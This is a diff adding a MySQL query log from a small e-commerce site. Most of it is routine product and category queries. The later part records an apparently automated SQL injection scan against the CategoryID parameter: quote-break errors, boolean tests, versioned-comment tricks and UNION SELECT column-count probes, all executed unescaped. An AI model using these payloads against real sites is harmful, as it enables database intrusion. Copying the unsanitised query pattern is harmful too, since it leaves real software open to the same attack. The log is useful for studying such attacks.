@@ -1,0 +1,714 @@
+[2021-02-12 03:59:45]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 03:59:45]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 03:59:45]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 03:59:45]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 03:59:45]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:45]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:45]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:45]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 03:59:46]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 06:07:07]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 06:07:07]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 06:07:07]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 06:07:07]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:21]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 08:48:21]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 08:48:21]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 08:48:21]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 08:48:21]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:21]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:21]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:21]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 08:48:22]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 11:54:33]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 11:54:33]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 11:54:33]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 11:54:33]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 12:35:03]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 12:35:03]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 12:35:03]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 12:35:03]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 15:20:49]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 15:20:49]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 15:20:49]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 15:20:49]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 16:13:30]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 16:13:30]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 16:13:30]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 16:13:30]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:06:15]	select * from _tbl_sliders order by SliderOrder asc
+[2021-02-12 20:06:15]	select * from _tbl_right_sliders order by SliderOrder asc
+[2021-02-12 20:06:15]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='12' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='14' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='19' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='13' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='6' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='5' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='4' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='8' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='2' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='1' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='15' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='16' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='17' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='3' and IsActive='1' order by ProductID 
+[2021-02-12 20:06:15]	select * from _tbl_products where CategoryID='18' and IsActive='1' order by ProductID 
+[2021-02-12 20:31:10]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:10]	select * from _tbl_products where CategoryID='12' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:10]	select * from _tbl_products where CategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:10]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:10]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:10]	select * from _tbl_sub_category where CategoryID='12' order by SubCategoryName
+[2021-02-12 20:31:10]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:10]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:10]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:10]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:10]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:19]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:19]	select * from _tbl_products where CategoryID='12'' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:19]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1
+[2021-02-12 20:31:19]	select * from _tbl_products where CategoryID='12''  and IsActive='1'
+[2021-02-12 20:31:19]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1
+[2021-02-12 20:31:19]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:19]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:19]	select * from _tbl_sub_category where CategoryID='12'' order by SubCategoryName
+[2021-02-12 20:31:19]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''12'' order by SubCategoryName' at line 1
+[2021-02-12 20:31:24]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:24]	select * from _tbl_products where CategoryID='12' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:24]	select * from _tbl_products where CategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:24]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:24]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:24]	select * from _tbl_sub_category where CategoryID='12' order by SubCategoryName
+[2021-02-12 20:31:24]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:24]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:24]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:24]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:24]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:25]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:25]	select * from _tbl_products where CategoryID='999999.9' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:25]	select * from _tbl_products where CategoryID='999999.9'  and IsActive='1'
+[2021-02-12 20:31:25]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:25]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:25]	select * from _tbl_sub_category where CategoryID='999999.9' order by SubCategoryName
+[2021-02-12 20:31:26]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:26]	select * from _tbl_products where CategoryID='12 and 1=1' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:26]	select * from _tbl_products where CategoryID='12 and 1=1'  and IsActive='1'
+[2021-02-12 20:31:26]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:26]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:26]	select * from _tbl_sub_category where CategoryID='12 and 1=1' order by SubCategoryName
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:26]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:26]	select * from _tbl_products where CategoryID='12 and 1>1' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:26]	select * from _tbl_products where CategoryID='12 and 1>1'  and IsActive='1'
+[2021-02-12 20:31:26]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:26]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:26]	select * from _tbl_sub_category where CategoryID='12 and 1>1' order by SubCategoryName
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:26]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:27]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:27]	select * from _tbl_products where CategoryID='12' and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:27]	select * from _tbl_products where CategoryID='12' and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:27]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:27]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:27]	select * from _tbl_sub_category where CategoryID='12' and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:27]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:27]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:27]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:27]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:27]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:28]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:28]	select * from _tbl_products where CategoryID='12' and 'x'='y' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:28]	select * from _tbl_products where CategoryID='12' and 'x'='y'  and IsActive='1'
+[2021-02-12 20:31:28]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:28]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:28]	select * from _tbl_sub_category where CategoryID='12' and 'x'='y' order by SubCategoryName
+[2021-02-12 20:31:28]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:28]	select * from _tbl_products where CategoryID='12' and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:28]	select * from _tbl_products where CategoryID='12' and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:28]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:28]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:28]	select * from _tbl_sub_category where CategoryID='12' and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:28]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:28]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:28]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:28]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:28]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:29]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:29]	select * from _tbl_products where CategoryID='12'' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:29]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1
+[2021-02-12 20:31:29]	select * from _tbl_products where CategoryID='12''  and IsActive='1'
+[2021-02-12 20:31:29]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1
+[2021-02-12 20:31:29]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:29]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:29]	select * from _tbl_sub_category where CategoryID='12'' order by SubCategoryName
+[2021-02-12 20:31:29]	SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''12'' order by SubCategoryName' at line 1
+[2021-02-12 20:31:29]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:29]	select * from _tbl_products where CategoryID='12' and 1=/*!30000 1*/ and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:29]	select * from _tbl_products where CategoryID='12' and 1=/*!30000 1*/ and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:29]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:29]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:29]	select * from _tbl_sub_category where CategoryID='12' and 1=/*!30000 1*/ and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:29]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:29]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:29]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:29]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:29]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:30]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:30]	select * from _tbl_products where CategoryID='12' and 1=/*!40100 1*/ and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:30]	select * from _tbl_products where CategoryID='12' and 1=/*!40100 1*/ and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:30]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:30]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:30]	select * from _tbl_sub_category where CategoryID='12' and 1=/*!40100 1*/ and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:30]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:30]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:30]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:30]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:30]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:31]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:31]	select * from _tbl_products where CategoryID='12' and 1=/*!50000 1*/ and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:31]	select * from _tbl_products where CategoryID='12' and 1=/*!50000 1*/ and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:31]	select * from _tbl_category where CategoryID='12'
+[2021-02-12 20:31:31]	select * from _tbl_sub_category where SubCategoryID='29'
+[2021-02-12 20:31:31]	select * from _tbl_sub_category where CategoryID='12' and 1=/*!50000 1*/ and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:31]	select CategoryID from _tbl_products where SubCategoryID='29'  and IsActive='1'
+[2021-02-12 20:31:31]	select CategoryID from _tbl_products where SubCategoryID='12'  and IsActive='1'
+[2021-02-12 20:31:31]	select CategoryID from _tbl_products where SubCategoryID='23'  and IsActive='1'
+[2021-02-12 20:31:31]	select CategoryID from _tbl_products where SubCategoryID='22'  and IsActive='1'
+[2021-02-12 20:31:31]	select CategoryID from _tbl_products where SubCategoryID='13'  and IsActive='1'
+[2021-02-12 20:31:31]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:31]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:31]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:31]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:31]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:31]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:31]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:31]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:31]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:32]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:32]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
+[2021-02-12 20:31:32]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'SubCategoryID' in 'field list'
+[2021-02-12 20:31:32]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536 and 'x'='x'  and IsActive='1'
+[2021-02-12 20:31:32]	SQLSTATE[42S22]: Column not found: 1054 Unknown column 'IsActive' in 'field list'
+[2021-02-12 20:31:32]	select * from _tbl_category where CategoryID=''
+[2021-02-12 20:31:32]	select * from _tbl_sub_category where SubCategoryID=''
+[2021-02-12 20:31:32]	select * from _tbl_sub_category where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536 and 'x'='x' order by SubCategoryName
+[2021-02-12 20:31:32]	SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+[2021-02-12 20:31:33]	select * from _tbl_category where IsActive='1' order by ListOrder
+[2021-02-12 20:31:33]	select * from _tbl_products where CategoryID='999999.9' union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536 and 'x'='x' and SubCategoryID='' and IsActive='1'
